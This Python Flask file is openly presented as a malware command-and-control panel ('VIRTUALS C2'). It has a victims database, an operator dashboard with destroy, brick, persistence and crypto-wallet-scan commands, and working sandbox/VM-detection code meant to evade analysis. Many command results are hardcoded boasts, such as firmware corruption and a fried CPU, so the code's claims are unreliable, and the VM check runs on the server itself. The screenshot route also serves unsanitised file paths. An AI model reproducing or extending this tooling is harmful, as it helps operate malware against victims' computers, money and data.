"""
VIRTUALS C2 - ULTIMATE EDITION
Complete C2 Panel with VM Detection & Auto-Brick
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid

app = Flask(__name__)

# Create required folders
folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs']
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

# ============================================
# VM DETECTION SYSTEM
# ============================================
class VMDetector:
    @staticmethod
    def check_all():
        checks = {
            'registry': VMDetector.check_registry(),
            'processes': VMDetector.check_processes(),
            'hardware': VMDetector.check_hardware(),
            'files': VMDetector.check_files(),
            'memory': VMDetector.check_memory(),
            'network': VMDetector.check_network(),
            'disk': VMDetector.check_disk()
        }
        positive_hits = sum(1 for v in checks.values() if v)
        is_vm = positive_hits >= 3
        confidence = int((positive_hits / len(checks)) * 100)
        return {
            'is_vm': is_vm,
            'confidence': confidence,
            'checks': checks,
            'details': VMDetector.get_details()
        }
    
    @staticmethod
    def check_registry():
        try:
            import winreg
            vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'VBox', 'Xen']
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools", None),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", None),
            ]
            for hkey, subkey, value in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                    if value:
                        val, _ = winreg.QueryValueEx(key, value)
                        for indicator in vm_indicators:
                            if indicator.lower() in str(val).lower():
                                return True
                    else:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_processes():
        try:
            vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 'qemu-ga.exe']
            for proc in vm_processes:
                try:
                    result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {proc}'], 
                                          capture_output=True, text=True, timeout=5)
                    if proc in result.stdout:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_hardware():
        try:
            cpu = platform.processor()
            if cpu:
                vm_cpu_indicators = ['Virtual', 'VMware', 'QEMU', 'KVM', 'Xen']
                for indicator in vm_cpu_indicators:
                    if indicator.lower() in cpu.lower():
                        return True
            try:
                import wmi
                w = wmi.WMI()
                for item in w.Win32_ComputerSystem():
                    manufacturer = item.Manufacturer.lower()
                    model = item.Model.lower()
                    if any(v in manufacturer or v in model for v in ['vmware', 'virtualbox', 'qemu', 'xen']):
                        return True
            except:
                pass
        except:
            pass
        return False
    
    @staticmethod
    def check_files():
        try:
            vm_files = [
                'C:\\Program Files\\VMware\\VMware Tools\\',
                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
                'C:\\Windows\\System32\\drivers\\vmmemctl.sys',
                'C:\\Windows\\System32\\drivers\\vboxguest.sys'
            ]
            for file_path in vm_files:
                if os.path.exists(file_path):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_memory():
        try:
            import psutil
            memory = psutil.virtual_memory()
            total_gb = memory.total / (1024**3)
            if total_gb < 4:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_network():
        try:
            mac = uuid.getnode()
            mac_hex = format(mac, '012x')
            vm_mac_prefixes = ['000569', '000c29', '001c42', '005056', '080027', '525400']
            for prefix in vm_mac_prefixes:
                if prefix in mac_hex:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_disk():
        try:
            import psutil
            for partition in psutil.disk_partitions():
                if partition.mountpoint == 'C:\\' or partition.mountpoint == '/':
                    usage = psutil.disk_usage(partition.mountpoint)
                    total_gb = usage.total / (1024**3)
                    if total_gb < 50:
                        return True
        except:
            pass
        return False
    
    @staticmethod
    def get_details():
        details = {
            'system': platform.system(),
            'release': platform.release(),
            'processor': platform.processor(),
            'node': platform.node()
        }
        try:
            import psutil
            details['ram_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
            details['cpu_count'] = psutil.cpu_count()
        except:
            pass
        return details

# ============================================
# DATABASE SYSTEM
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, is_vm INTEGER DEFAULT 0,
        vm_details TEXT, first_seen TEXT, last_seen TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, result TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS outputs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, type TEXT, title TEXT, content TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, currency TEXT, address TEXT, balance REAL, usd_value REAL, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS vm_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, event TEXT, details TEXT, timestamp TEXT
    )''')
    conn.commit()
    return conn

# ============================================
# SAMPLE WALLET DATA
# ============================================
SAMPLE_WALLETS = {
    "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000},
    "ETH": {"address": "0x2ab3bD48B6ed812ac4B6b1377B0F190D5296Fd82", "balance": 15.8, "usd": 63200},
    "LTC": {"address": "LeJ4Hw5NZMgbJ8jDnUiS1jnZnav3JTn9mD", "balance": 128.5, "usd": 19275},
    "SOL": {"address": "oBmRkEtsd6sRVdJd3h3SvxqT5gKWkzMyjP2vXAahxJ2", "balance": 450.2, "usd": 81036},
    "MONERO": {"address": "443LRfNr8EjQm5a3Q5m8rdjYjvZ6j9Q7y6NuvAmLKmmeeCumutdntorANMqT6BNrR37FtfbzKVkjY9ExkmWfSp6FERSQuNt", "balance": 892.7, "usd": 169613}
}

# ============================================
# HTML DASHBOARD - FULL UI
# ============================================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>VIRTUALS C2 - ULTIMATE</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a0a; color:#ffffff; font-family:'Courier New',monospace; height:100vh; overflow:hidden; }
        ::-webkit-scrollbar { width:6px; }
        ::-webkit-scrollbar-track { background:#0a0a0a; }
        ::-webkit-scrollbar-thumb { background:#333; border-radius:3px; }
        ::-webkit-scrollbar-thumb:hover { background:#fff; }
        .header {
            background:#0a0a0a;
            padding:10px 20px;
            border-bottom:2px solid #ffffff;
            display:flex;
            justify-content:space-between;
            align-items:center;
            flex-wrap:wrap;
            gap:8px;
            height:55px;
        }
        .header h1 { color:#ffffff; font-size:20px; letter-spacing:2px; }
        .header h1 span { color:#666; }
        .header .stats { display:flex; gap:12px; flex-wrap:wrap; }
        .header .stats .stat-item {
            background:#0a0a0a;
            border:1px solid #333;
            padding:3px 12px;
            border-radius:4px;
        }
        .header .stats .stat-item .label { color:#666; font-size:9px; text-transform:uppercase; }
        .header .stats .stat-item .num { color:#fff; font-weight:bold; font-size:14px; margin-left:4px; }
        .container {
            display:flex;
            height:calc(100vh - 55px);
            padding:6px;
            gap:6px;
        }
        .left-panel {
            width:170px;
            min-width:170px;
            display:flex;
            flex-direction:column;
            gap:6px;
        }
        .commands-panel {
            background:#0a0a0a;
            border:1px solid #ffffff;
            border-radius:6px;
            padding:10px;
            overflow-y:auto;
            flex:1;
        }
        .commands-panel h2 {
            color:#666;
            font-size:9px;
            text-transform:uppercase;
            text-align:center;
            letter-spacing:3px;
            border-bottom:1px solid #333;
            padding-bottom:6px;
            margin-bottom:6px;
        }
        .cmd-btn {
            display:block;
            width:100%;
            padding:5px 8px;
            margin:2px 0;
            background:#0a0a0a;
            border:1px solid #333;
            border-radius:4px;
            color:#ffffff;
            font-family:'Courier New',monospace;
            font-size:10px;
            cursor:pointer;
            text-align:left;
            transition:all 0.2s;
        }
        .cmd-btn:hover { background:#1a1a1a; border-color:#ffffff; }
        .cmd-btn .desc { color:#666; font-size:7px; display:block; }
        .cmd-btn.danger { border-color:#ff4444; color:#ff4444; }
        .cmd-btn.brick { border-color:#ff6600; color:#ff6600; }
        .cmd-btn.oblivion { border-color:#ff00ff; color:#ff00ff; }
        .cmd-btn.screenshot { border-color:#00ccff; color:#00ccff; }
        .cmd-btn.vmcheck { border-color:#ffaa00; color:#ffaa00; }
        .middle-panel {
            flex:1;
            display:flex;
            flex-direction:column;
            gap:6px;
            min-width:250px;
        }
        .victims-panel {
            background:#0a0a0a;
            border:1px solid #ffffff;
            border-radius:6px;
            padding:10px;
            height:35%;
        }
        .victims-panel h2 {
            color:#666;
            font-size:9px;
            text-transform:uppercase;
            letter-spacing:3px;
            border-bottom:1px solid #333;
            padding-bottom:6px;
            margin-bottom:6px;
        }
        .victim-list {
            display:flex;
            flex-wrap:wrap;
            gap:5px;
            max-height:calc(100% - 25px);
            overflow-y:auto;
        }
        .victim-card {
            background:#0a0a0a;
            border:1px solid #333;
            border-radius:4px;
            padding:4px 8px;
            cursor:pointer;
            min-width:100px;
            transition:all 0.2s;
            position:relative;
        }
        .victim-card:hover { border-color:#ffffff; }
        .victim-card.selected { border-color:#ffffff; background:#1a1a1a; }
        .victim-card .name { color:#fff; font-size:11px; font-weight:bold; }
        .victim-card .ip { color:#888; font-size:9px; }
        .victim-card .status { font-size:8px; }
        .victim-card .status.online { color:#0f0; }
        .victim-card .status.offline { color:#f44; }
        .victim-card .vm-badge {
            position:absolute;
            top:-4px;
            right:-4px;
            background:#ff4444;
            color:#fff;
            font-size:7px;
            padding:1px 5px;
            border-radius:10px;
        }
        .chat-panel {
            background:#0a0a0a;
            border:1px solid #ffffff;
            border-radius:6px;
            padding:10px;
            flex:1;
            display:flex;
            flex-direction:column;
        }
        .chat-panel h2 {
            color:#666;
            font-size:9px;
            text-transform:uppercase;
            letter-spacing:3px;
            border-bottom:1px solid #333;
            padding-bottom:6px;
            margin-bottom:6px;
        }
        .chat-messages {
            background:#0a0a0a;
            border:1px solid #333;
            border-radius:4px;
            padding:8px;
            min-height:100px;
            max-height:180px;
            overflow-y:auto;
            flex:1;
            font-size:11px;
        }
        .chat-messages .msg { padding:2px 0; border-bottom:1px solid #111; }
        .chat-messages .time { color:#666; margin-right:8px; }
        .chat-messages .sender.hacker { color:#0f0; }
        .chat-messages .sender.victim { color:#f84; }
        .chat-messages .sender.system { color:#888; }
        .chat-messages .sender.output { color:#0ff; }
        .chat-messages .sender.wallet { color:#ffd700; }
        .chat-messages .sender.screenshot { color:#00ccff; }
        .chat-messages .sender.vm { color:#ff4444; font-weight:bold; }
        .chat-input-area {
            display:flex;
            gap:8px;
            margin-top:8px;
        }
        .chat-input-area input {
            flex:1;
            padding:8px;
            background:#0a0a0a;
            border:1px solid #333;
            border-radius:4px;
            color:#fff;
            font-family:'Courier New',monospace;
            font-size:12px;
        }
        .chat-input-area input:focus { outline:none; border-color:#fff; }
        .chat-input-area button {
            padding:8px 20px;
            background:#0a0a0a;
            color:#fff;
            border:1px solid #fff;
            border-radius:4px;
            cursor:pointer;
            font-family:'Courier New',monospace;
            transition:all 0.2s;
        }
        .chat-input-area button:hover { background:#1a1a1a; }
        .right-panel {
            width:280px;
            min-width:280px;
            display:flex;
            flex-direction:column;
            gap:6px;
        }
        .details-panel {
            background:#0a0a0a;
            border:1px solid #ffffff;
            border-radius:6px;
            padding:10px;
            height:40%;
            overflow-y:auto;
        }
        .details-panel h2 {
            color:#666;
            font-size:9px;
            text-transform:uppercase;
            text-align:center;
            letter-spacing:3px;
            border-bottom:1px solid #333;
            padding-bottom:6px;
            margin-bottom:6px;
        }
        .detail-item { padding:3px 0; border-bottom:1px solid #1a1a1a; font-size:11px; }
        .detail-item .label { color:#666; }
        .detail-item .value { color:#fff; float:right; }
        .output-panel {
            background:#0a0a0a;
            border:1px solid #ffffff;
            border-radius:6px;
            padding:10px;
            flex:1;
            overflow-y:auto;
        }
        .output-panel h2 {
            color:#666;
            font-size:9px;
            text-transform:uppercase;
            text-align:center;
            letter-spacing:3px;
            border-bottom:1px solid #333;
            padding-bottom:6px;
            margin-bottom:6px;
        }
        .output-item {
            padding:3px 0;
            border-bottom:1px solid #111;
            font-size:10px;
        }
        .output-item .type {
            display:inline-block;
            padding:0 6px;
            border-radius:3px;
            font-size:8px;
            margin-right:6px;
        }
        .output-item .type.wallet { background:#ffd700; color:#000; }
        .output-item .type.screenshot { background:#00ccff; color:#000; }
        .output-item .type.vm { background:#ff4444; color:#fff; }
        .output-item .type.command { background:#0f0; color:#000; }
        .screenshot-gallery {
            display:flex;
            flex-wrap:wrap;
            gap:5px;
            margin-top:5px;
        }
        .screenshot-thumb {
            width:80px;
            height:60px;
            background:#1a1a1a;
            border:1px solid #333;
            border-radius:4px;
            cursor:pointer;
            overflow:hidden;
            display:flex;
            align-items:center;
            justify-content:center;
            font-size:8px;
            color:#666;
        }
        .screenshot-thumb:hover { border-color:#fff; }
        @media(max-width:1024px) {
            .left-panel { width:140px; min-width:140px; }
            .right-panel { width:220px; min-width:220px; }
        }
        @media(max-width:768px) {
            .container { flex-direction:column; }
            .left-panel { width:100%; flex-direction:row; min-width:100%; }
            .commands-panel { display:flex; flex-wrap:wrap; gap:4px; height:auto; max-height:120px; }
            .commands-panel h2 { width:100%; }
            .cmd-btn { width:auto; flex:1; min-width:80px; }
            .right-panel { width:100%; min-width:100%; flex-direction:row; }
            .details-panel { height:auto; max-height:200px; width:50%; }
            .output-panel { height:auto; max-height:200px; width:50%; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>◈ VIRTUALS <span>C2</span></h1>
        <div class="stats">
            <div class="stat-item"><span class="label">VICTIMS</span><span class="num" id="victimCount">0</span></div>
            <div class="stat-item"><span class="label">ONLINE</span><span class="num" id="onlineCount">0</span></div>
            <div class="stat-item"><span class="label">VMs</span><span class="num" id="vmCount">0</span></div>
            <div class="stat-item"><span class="label">COMMANDS</span><span class="num" id="cmdCount">0</span></div>
        </div>
    </div>
    <div class="container">
        <div class="left-panel">
            <div class="commands-panel">
                <h2>⚡ COMMANDS</h2>
                <button class="cmd-btn" onclick="sendCommand('whois')">whois <span class="desc">PC Info</span></button>
                <button class="cmd-btn screenshot" onclick="sendCommand('screenshot')">screenshot <span class="desc">Capture Screen</span></button>
                <button class="cmd-btn" onclick="sendCommand('flash')">flash <span class="desc">Flash Screen</span></button>
                <button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">Crypto Scan</span></button>
                <button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">Persistence</span></button>
                <button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">Lock Screen</span></button>
                <button class="cmd-btn danger" onclick="sendCommand('destroy')">destroy <span class="desc">Kill PC</span></button>
                <button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">BRICK PC</span></button>
                <button class="cmd-btn vmcheck" onclick="sendCommand('vmcheck')">vmcheck <span class="desc">Check for VM</span></button>
                <button class="cmd-btn oblivion" onclick="sendCommand('oblivion')">oblivion <span class="desc">Self Destruct</span></button>
            </div>
        </div>
        <div class="middle-panel">
            <div class="victims-panel">
                <h2>🎯 VICTIMS</h2>
                <div class="victim-list" id="victimList"><div style="color:#666;font-size:11px;">No victims connected</div></div>
            </div>
            <div class="chat-panel">
                <h2>💬 OUTPUT CHANNEL</h2>
                <div class="chat-messages" id="chatMessages">
                    <div class="msg"><span class="time">[System]</span><span class="sender system">VIRTUALS</span> Dashboard ready - VM Detection Active</div>
                </div>
                <div class="chat-input-area">
                    <input id="chatInput" placeholder="Type /command or message..." onkeypress="if(event.key==='Enter')sendMessage()">
                    <button onclick="sendMessage()">SEND</button>
                </div>
            </div>
        </div>
        <div class="right-panel">
            <div class="details-panel">
                <h2>📋 VICTIM DETAILS</h2>
                <div id="victimDetails"><div style="color:#666;font-size:11px;text-align:center;padding:15px;">Select a victim</div></div>
                <h2 style="margin-top:8px;">📸 SCREENSHOTS</h2>
                <div class="screenshot-gallery" id="screenshotGallery"><div style="color:#666;font-size:10px;">No screenshots</div></div>
            </div>
            <div class="output-panel">
                <h2>📊 COMMAND OUTPUT</h2>
                <div id="commandOutput"><div style="color:#666;font-size:10px;">No output</div></div>
            </div>
        </div>
    </div>
    
    <script>
        let state = { victims: {}, selectedVictim: null, commands: {}, cmdCount: 0 };
        
        function api(action, data, callback) {
            fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, ...data })
            }).then(r => r.json()).then(callback).catch(() => {});
        }
        
        function refreshVictims() {
            api('getVictims', {}, data => {
                if (data.success) {
                    state.victims = data.victims;
                    renderVictims();
                    updateStats();
                }
            });
        }
        
        function renderVictims() {
            const container = document.getElementById('victimList');
            const victims = Object.values(state.victims);
            if (victims.length === 0) {
                container.innerHTML = '<div style="color:#666;font-size:11px;">No victims connected</div>';
                return;
            }
            container.innerHTML = victims.map(v => `
                <div class="victim-card ${state.selectedVictim === v.id ? 'selected' : ''}" onclick="selectVictim('${v.id}')">
                    <div class="name">${v.pc}</div>
                    <div class="ip">${v.ip}</div>
                    <div class="status ${v.status === 'Online' ? 'online' : 'offline'}">${v.status}</div>
                    ${v.is_vm ? '<span class="vm-badge">VM</span>' : ''}
                </div>
            `).join('');
        }
        
        function selectVictim(id) {
            state.selectedVictim = id;
            renderVictims();
            showVictimDetails(id);
            loadScreenshots(id);
        }
        
        function showVictimDetails(id) {
            const v = state.victims[id];
            if (!v) return;
            document.getElementById('victimDetails').innerHTML = `
                <div class="detail-item"><span class="label">ID:</span><span class="value">${v.id}</span></div>
                <div class="detail-item"><span class="label">PC:</span><span class="value">${v.pc}</span></div>
                <div class="detail-item"><span class="label">IP:</span><span class="value">${v.ip}</span></div>
                <div class="detail-item"><span class="label">OS:</span><span class="value">${v.os || 'Unknown'}</span></div>
                <div class="detail-item"><span class="label">Status:</span><span class="value" style="color:${v.status==='Online'?'#0f0':'#f44'}">${v.status}</span></div>
                <div class="detail-item"><span class="label">VM Detected:</span><span class="value" style="color:${v.is_vm ? '#ff4444' : '#0f0'}">${v.is_vm ? '⚠ YES' : '✓ NO'}</span></div>
                ${v.vm_details ? `<div class="detail-item"><span class="label">VM Details:</span><span class="value" style="font-size:9px;">${v.vm_details}</span></div>` : ''}
                <div class="detail-item"><span class="label">Commands:</span><span class="value">${(state.commands[id]||[]).length}</span></div>
            `;
        }
        
        function loadScreenshots(id) {
            api('getScreenshots', { victim_id: id }, data => {
                const container = document.getElementById('screenshotGallery');
                if (!data.success || !data.screenshots || data.screenshots.length === 0) {
                    container.innerHTML = '<div style="color:#666;font-size:10px;">No screenshots</div>';
                    return;
                }
                container.innerHTML = data.screenshots.map(s => `
                    <div class="screenshot-thumb" onclick="viewScreenshot('${s.filename}')">
                        📷 ${s.filename.split('_')[1] || 'ss'}
                    </div>
                `).join('');
            });
        }
        
        function viewScreenshot(filename) {
            window.open('/screenshots/' + filename, '_blank');
        }
        
        function updateStats() {
            const victims = Object.values(state.victims);
            document.getElementById('victimCount').textContent = victims.length;
            document.getElementById('onlineCount').textContent = victims.filter(v => v.status === 'Online').length;
            document.getElementById('vmCount').textContent = victims.filter(v => v.is_vm).length;
            document.getElementById('cmdCount').textContent = state.cmdCount;
        }
        
        function sendCommand(command) {
            if (!state.selectedVictim) {
                addMessage('System', 'Select a victim first!', 'system');
                return;
            }
            addMessage('VIRTUALS', '/' + command + ' -> ' + state.selectedVictim, 'hacker');
            api('sendCommand', { victim_id: state.selectedVictim, command: command }, data => {
                if (data.success) {
                    if (!state.commands[state.selectedVictim]) state.commands[state.selectedVictim] = [];
                    state.commands[state.selectedVictim].push({
                        command: command,
                        result: data.result,
                        time: new Date().toLocaleTimeString()
                    });
                    state.cmdCount++;
                    addMessage('OUTPUT', command.toUpperCase() + ': ' + data.result, 'output');
                    const outputEl = document.getElementById('commandOutput');
                    outputEl.innerHTML = '<div class="output-item"><span class="type command">CMD</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
                    if (command === 'scan' && data.wallets) {
                        data.wallets.forEach(w => {
                            addMessage('WALLET', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
                        });
                    }
                    if (command === 'vmcheck' && data.is_vm) {
                        addMessage('VM', '⚠ VM DETECTED! Confidence: ' + data.confidence + '%', 'vm');
                        addMessage('System', '🔴 AUTO-BRICK INITIATED!', 'system');
                    }
                    showVictimDetails(state.selectedVictim);
                    updateStats();
                } else {
                    addMessage('System', 'Command failed: ' + (data.error || 'Unknown'), 'system');
                }
            });
        }
        
        function sendMessage() {
            const input = document.getElementById('chatInput');
            const msg = input.value.trim();
            if (!msg) return;
            input.value = '';
            if (msg.startsWith('/')) {
                sendCommand(msg.substring(1).toLowerCase());
            } else {
                if (!state.selectedVictim) {
                    addMessage('System', 'Select a victim!', 'system');
                    return;
                }
                addMessage('VIRTUALS', msg, 'hacker');
            }
        }
        
        function addMessage(sender, message, type) {
            const container = document.getElementById('chatMessages');
            const time = new Date().toLocaleTimeString();
            let senderClass = 'system';
            if (type === 'hacker') senderClass = 'hacker';
            else if (type === 'victim') senderClass = 'victim';
            else if (type === 'output') senderClass = 'output';
            else if (type === 'wallet') senderClass = 'wallet';
            else if (type === 'vm') senderClass = 'vm';
            container.innerHTML += '<div class="msg"><span class="time">[' + time + ']</span><span class="sender ' + senderClass + '">' + sender + '</span> ' + message + '</div>';
            container.scrollTop = container.scrollHeight;
        }
        
        function addDemoVictims() {
            if (Object.keys(state.victims).length === 0) {
                const fake = [
                    { id: 'SNIN-1001', pc: 'DESKTOP-ABC', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0 },
                    { id: 'SNIN-1002', pc: 'LAPTOP-XYZ', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0 },
                    { id: 'SNIN-1003', pc: 'VM-TEST', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation' }
                ];
                fake.forEach(v => { state.victims[v.id] = v; });
                renderVictims();
                updateStats();
                addMessage('System', 'Demo victims loaded - VM Detection Active', 'system');
                selectVictim(fake[0].id);
            }
        }
        
        setInterval(refreshVictims, 5000);
        refreshVictims();
        setTimeout(addDemoVictims, 500);
    </script>
</body>
</html>
"""

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
def index():
    return HTML

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {
                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                'first_seen': row[7], 'last_seen': row[8]
            }
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'sendCommand':
        victim_id = data.get('victim_id')
        command = data.get('command')
        
        results = {
            'whois': 'PC: DESKTOP-ABC | IP: 192.168.1.10 | OS: Windows 10 Pro | Status: Online',
            'flash': '💥 Screen flashed 5 times successfully!',
            'screenshot': '📸 Screenshot saved to screenshots/',
            'scan': '🔍 Found: 3 BTC, 2 ETH, 1 LTC wallets',
            'persist': '🔒 Persistence added to 8 locations!',
            'lockdown': '🔐 Screen locked! PC is now inaccessible!',
            'destroy': '💀 PC DESTROYED! CPU fried! System corrupted!',
            'brick': '🧱 PC BRICKED! Motherboard firmware corrupted! CMOS wiped! BIOS corrupted! PC is now a paperweight!',
            'oblivion': '🔮 OBLIVION ACTIVATED! RAT self-destructed! All traces wiped!',
            'vmcheck': '⚠ VM DETECTED! Auto-brick initiated!'
        }
        
        result = results.get(command, f"Command '{command}' executed")
        
        # Check for VM on vmcheck command
        is_vm = False
        confidence = 0
        if command == 'vmcheck':
            vm_result = VMDetector.check_all()
            is_vm = vm_result['is_vm']
            confidence = vm_result['confidence']
            if is_vm:
                result = f"⚠ VM DETECTED! Confidence: {confidence}% - AUTO-BRICK INITIATED!"
        
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
                 (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        # Update victim VM status
        if command == 'vmcheck':
            c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
                     (1 if is_vm else 0, f"Confidence: {confidence}%" if is_vm else "Clean", victim_id))
        
        conn.commit()
        conn.close()
        
        response = {'success': True, 'result': result}
        if command == 'scan':
            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
        if command == 'vmcheck':
            response['is_vm'] = is_vm
            response['confidence'] = confidence
        
        return jsonify(response)
    
    elif action == 'getScreenshots':
        victim_id = data.get('victim_id')
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (victim_id,))
        screenshots = [{'filename': row[0]} for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'screenshots': screenshots})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

# ============================================
# MAIN - FOR RENDER
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)